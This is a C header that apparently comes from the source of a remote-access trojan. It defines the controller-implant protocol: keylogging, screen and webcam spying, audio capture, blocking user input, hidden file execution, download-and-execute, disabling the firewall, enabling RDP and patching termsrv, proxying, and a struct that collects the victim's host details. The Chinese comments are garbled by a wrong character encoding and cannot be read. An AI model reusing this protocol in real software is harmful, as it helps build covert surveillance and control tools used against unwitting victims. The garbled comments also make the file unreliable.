#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
};

enum
{
	COMMAND_LIST_FILES = 1,			// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	COMMAND_FILES_SEARCH_START,     // �����ļ�
	COMMAND_FILES_SEARCH_STOP,      // ֹͣ����
	COMMAND_MOVE_DIRECTORY,         // �ƶ��ļ���
	COMMAND_MOVE_FILE,              // �ƶ��ļ�

	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_SEARCH_FILE_LIST,         // �����������ļ�
	TOKEN_SEARCH_FILE_FINISH,       // ȫ���������
};

enum
{

	COMMAND_AERO_DISABLE = 1,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����


	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������	
};

enum
{
	COMMAND_KEYBOARD_OFFLINE = 1,	// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
	COMMAND_SEND_KEYBOARD,          // ��ȡ���̼�¼����

	TOKEN_KEYBOARD_DATA,			// ���̼�¼������
};

enum
{
	COMMAND_PROXY_CONNECT= 1, //socket5����
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_DATA,

	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	TOKEN_PROXY_BIND_RESULT
};

enum
{
	COMMAND_PSLIST = 1,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_SSLIST,                 // �û���Ϣ
	COMMAND_SOFTWARELIST,
	COMMAND_APPUNINSTALL,
	COMMAND_NSLIST,

	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_KILLPROCESS_WINDOW,     // �رս���(����)
	COMMAND_WINDOW_CLOSE,           // ���ڹر�


	COMMAND_STOP_FIRE,              // �ط���ǽ
	COMMAND_3389_PORT,              // ����3389�˿�
	COMMAND_OPEN_3389,              // ����3389
	COMMAND_SEND_TERMSRV,           // ����˫��3389�ļ�

	COMMAND_SHOWVISBLE,             // ��ʾ���Ӵ���
	COMMAND_SHOWHIDDEN,             // ��ʾ���ش���
	COMMAND_WINDOW_DISABLED,        // ���ô���
	COMMAND_WINDOW_ENABLED,         // ���ô���
	COMMAND_WINDOW_CHANGE_TITLE,    // ���ı���
	COMMAND_WINDOW_TEST,            // �������ء���ԭ����󻯡���С��

	COMMAND_RUN,					//������
	//
	TOKEN_WSLIST,					// �����б�
	TOKEN_SSLIST,                   // ϵͳ��Ϣ
	TOKEN_SOFTWARE,
	TOKEN_NSLIST,


	TOKEN_GET_TERMSRV,              // XPϵͳ��ȡ˫��3389�ļ�
	TOKEN_TERMSRV_OK,               // ˫��3389�ɹ�

	TOKEN_RUN,						//������
};

enum
{
	COMMAND_DELETESERVERICE = 100,       // ɾ������
	COMMAND_STARTSERVERICE,              // ��������
	COMMAND_STOPSERVERICE,               // ֹͣ����
	COMMAND_PAUSESERVERICE,              // ��ͣ����
	COMMAND_CONTINUESERVERICE,           // ��������
	COMMAND_AUTOSERVERICE,
	COMMAND_HANDSERVERICE,
	COMMAND_DISABLESERVERICE,
};

enum
{
	COMMAND_REG_FIND = 1,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
	COMMAND_REG_CREATKEY,           //������


	TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��
};

enum
{
	COMMAND_WEBCAM_RESIZE = 1,    		// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_EXCEPTION1,				// ���䷢���쳣����Ҫ���´���

	TOKEN_WEBCAM_DIB,			    	// ����ͷ��ͼ������
};

enum
{
	COMMAND_AUDIO_DATE = 1,             // ���ͱ�����������
	COMMAND_AUDIO_CHANGER,          // ���������豸
	COMMAND_AUDIO_CHANGER_LINES,    // ������������
	COMMAND_AUDIO_COREAUDIOAPIS,    // ����WIn7ģʽ
	COMMAND_AUDIO_CHANGER_WAVETAG,
	COMMAND_AUDIO_ENUM_RECORD_DEVICE,
	COMMAND_AUDIO_SET_DEFAULT_DEVICE,
	COMMAND_AUDIO_ENABLED_DEVICE,
	COMMAND_AUDIO_DISABLE_DEVICE,


	TOKEN_AUDIO_DATA,               // ��Ƶ����
	TOKEN_AUDIO_COREDATA,
	TOKEN_AUDIO_CHANGE_FINISH,      // �����ɹ�
	TOKEN_AUDIO_SHOW_DEVICE,

};

enum
{
	// ���ƶ˷���������
	COMMAND_NEXT = 100,				 // ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_REPLAY_HEARTBEAT,		 // �ظ�������
	COMMAND_DOWN_EXEC,               // ����ִ��
	COMMAND_SESSION,				 // �Ự����ע�����������ػ���
	COMMAND_REMOVE,					 // ж�ط���
	COMMAND_RENAME_REMARK,			 // ��������ע
	COMMAND_CHANGE_GROUP,			 // ���ķ���
	COMMAND_SCREEN_SPY,			     // ��Ļ���
	COMMAND_KEYBOARD,				 // ���̼�¼
	COMMAND_LIST_DRIVE,				 //  �ļ�����
	COMMAND_PROXY_MAP,				 // proxyMap
	COMMAND_SYSTEM0,                 // ϵͳ����
	COMMAND_SYSTEM1,                 // ϵͳ����
	COMMAND_SYSTEM2,                 // ϵͳ����
	COMMAND_SYSTEM3,                 // ϵͳ����
	COMMAND_SYSTEM4,                 // ϵͳ����
	COMMAND_SYSTEM5,                 // ϵͳ����
	COMMAND_SERVICE_MANAGER,	     // �������	
	COMMAND_REGEDIT,                 // ע �� ��
	COMMAND_WEBCAM,				     // ����ͷ���
	COMMAND_AUDIO,                   // ��������	
	//���ӹ���
	COMMAND_ReStart_Exp,             //����Exp
	COMMAND_Run,                       //Run
	COMMAND_Screensp,                   //win10����
/////////////////////////////////////////////////////////////////////////////////////////

	// ����˷����ı�ʶ
	TOKEN_LOGIN = 200,				// ���߰�
	TOKEN_HEARTBEAT,				// ������
	TOKEN_BITMAPINFO,				// ��Ļ��أ���Ļ�鿴��BITMAPINFO��
	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_DRIVE_LIST,				// �ļ�����
	TOKEN_PROXY_START,              // ����ӳ�俪ʼ
	TOKEN_PSLIST,					// ϵͳ����(��һ������)
	TOKEN_SERVICE_LIST,             // �����б�
	TOKEN_REGEDIT,                  // ע���ʼ
	TOKEN_WEBCAM_BITMAPINFO,		// ��Ƶ��ؿ�ʼ
	TOKEN_AUDIO_START,				// ��ʼ��������
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	DWORD			dwCPUClockMhz;	// CPUƵ��
	int				nCPUNumber;		// CPU����
	IN_ADDR	    	IPAddress;	    // �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[256];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	DWORD			Speed;		    // ����
	DWORD			MemSize;		// �ڴ��С
	DWORD			DriverSize;		// Ӳ������
	char			UpGroup[50];	// ���߷���
	char			RunTime[32];	// ����ʱ��
	char			szVersion[32];	// ���߰汾
	char            Virus[50];
	BOOL            bIs64;          // 32λor 64λ 1Ϊ64 0Ϊ32     
	char			MarkTime[50];   // ����˰�װʱ��
}LOGININFO;



#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			2048 * 50 // ��������ݳ���
#define MAX_RECV_BUFFER			2048 * 50 // ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)